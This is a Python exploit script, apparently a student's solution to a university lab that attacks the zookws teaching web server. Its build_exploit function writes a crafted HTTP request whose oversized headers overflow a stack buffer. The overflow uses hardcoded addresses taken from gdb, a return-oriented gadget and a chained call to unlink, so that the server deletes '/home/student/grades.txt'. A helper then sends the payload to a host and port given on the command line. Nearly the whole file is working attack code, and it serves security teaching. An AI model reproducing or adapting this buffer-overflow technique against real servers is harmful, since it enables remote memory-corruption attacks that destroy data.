#!/usr/bin/env python3
import sys
import socket
import traceback
import urllib.parse
import struct
####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

# Got this from gdb
ADDR_BUFFER     = 0x7fffffffd9d0
ADDR_RETADDR    = 0x7fffffffdbe8
ADDR_RETUNLINK  = 0x7fffffffdbf8
ADDR_BP         = 0x7fffffffdbe0
ADDR_GADGET     = 0x555555556c3d
ADDR_UNLINK     = 0x1555553f80a0

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode: bytes) -> bytes:
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.parse.quote_from_bytes(s).encode('ascii')
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<Q", x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x


    # Then we want to pad up until the return bp and ip
    set_unlink_ret = b"A" * (ADDR_RETUNLINK - ADDR_BUFFER)
    set_unlink_ret += struct.pack("<Q", ADDR_UNLINK)

    clean_ret = b"A" * (ADDR_RETADDR - ADDR_BUFFER + 7) + b"\x00"

    set_ret = b"A" * (ADDR_RETADDR - ADDR_BUFFER)
    set_ret += struct.pack("<Q", ADDR_GADGET)

    clean_bp = b"A" * (ADDR_RETADDR - ADDR_BUFFER - 1) + b"\x00"

    set_bp = b"A" * (ADDR_BP - ADDR_BUFFER)
    set_bp += struct.pack("<Q", ADDR_BUFFER)

    set_filepath = b"A"*24 + b"/home/student/grades.txt\x00"

    clean_filepath_ptr = b"A" * 23 + b"\x00"

    set_filepath_ptr = b"A"*16
    set_filepath_ptr += struct.pack("<Q", (ADDR_BUFFER + 0x18))

    # clean_unlink = b"A"*15 + b"\x00"

    # set_unlink = b"A"*8
    # set_unlink += struct.pack("<Q", ADDR_UNLINK)

    # Then we write in the address of the buffer.
    # struct.pack("<Q") writes out 64-bit integers in little-endian.

    req =   b"GET / HTTP /1.0\r\n" + \
            b"HeaderA: " + set_unlink_ret + b"\r\n" + \
            b"HeaderB: " + clean_ret + b"\r\n" + \
            b"Header0: " + set_ret + b"\r\n" + \
            b"Header1: " + clean_bp + b"\r\n" + \
            b"Header2: " + set_bp + b"\r\n" + \
            b"Header3: " + set_filepath + b"\r\n" + \
            b"Header4: " + clean_filepath_ptr + b"\r\n" + \
            b"Header5: " + set_filepath_ptr + b"\r\n" + \
            b"\r\n"
    return req

####

def send_req(host: str, port: int, req: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

